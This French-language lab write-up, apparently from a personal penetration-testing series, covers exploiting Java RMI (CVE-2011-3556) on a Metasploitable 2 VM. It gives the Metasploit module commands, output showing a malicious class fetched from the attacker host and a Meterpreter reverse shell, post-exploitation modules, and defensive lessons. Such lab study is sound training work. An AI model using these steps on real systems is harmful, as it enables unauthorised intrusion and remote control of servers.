# Exploit #13 — Java RMI Server RCE

## Informations

| Champ | Valeur |
|---|---|
| Date | 2026-05-13 |
| Cible | Metasploitable 2 (192.168.100.2) |
| Attaquant | Kali Linux (192.168.100.3) |
| Port | 1099 |
| CVE | CVE-2011-3556 |
| Module | exploit/multi/misc/java_rmi_server |

## Description

Java RMI (Remote Method Invocation) est un mécanisme Java permettant
d'appeler des méthodes sur des objets distants. Le registre RMI écoute
sur le port 1099.

La version vulnérable sur Metasploitable accepte des connexions non
authentifiées et permet l'exécution de code arbitraire via le chargement
d'une classe Java malveillante depuis un serveur distant.

```
Attaquant (Kali)                    Cible (Metasploitable)
      |                                      |
      |--- connexion port 1099 ------------->|
      |--- URL classe malveillante --------->|
      |                              charge + exécute la classe
      |<--- reverse shell Meterpreter -------|
```

## Pourquoi c'est grave

- Pas d'authentification requise
- Le service tourne souvent en root ou avec des droits élevés
- Java RMI ne devrait jamais être exposé sur le réseau sans contrôle d'accès

---

## Étapes

### 1. Vérifier le service

```bash
db_nmap -sV -p 1099 192.168.100.2
```

Résultat attendu :
```
1099/tcp open  java-rmi  Java RMI
```

### 2. Lancer l'exploit

```bash
use exploit/multi/misc/java_rmi_server
set RHOSTS 192.168.100.2
set LHOST 192.168.100.3
run
```

Résultat attendu :
```
[*] Started reverse TCP handler on 192.168.100.3:4444
[*] 192.168.100.2:1099 - Using URL: http://192.168.100.3:8080/...
[*] Sending RMI Header...
[*] Sending RMI Call...
[*] Meterpreter session 1 opened
meterpreter >
```

### 3. Vérifier l'accès

```bash
getuid
sysinfo
```

### 4. Post-exploitation

```bash
run post/multi/recon/local_exploit_suggester
run post/linux/gather/enum_system
```

---

## Schéma d'attaque

```
Port 1099 ouvert (Java RMI)
        ↓
Chargement classe Java malveillante
        ↓
Exécution de code côté serveur
        ↓
Session Meterpreter
        ↓
Post-exploitation
```

---

## Leçons apprises

- Java RMI ne doit jamais être exposé sur un réseau non sécurisé
- Désactiver RMI si non utilisé, ou restreindre via firewall
- Les services Java legacy sont souvent des vecteurs d'attaque négligés
- Toujours vérifier les services qui tournent sur les ports > 1024

## Références

- https://www.rapid7.com/db/modules/exploit/multi/misc/java_rmi_server/
- https://nvd.nist.gov/vuln/detail/CVE-2011-3556
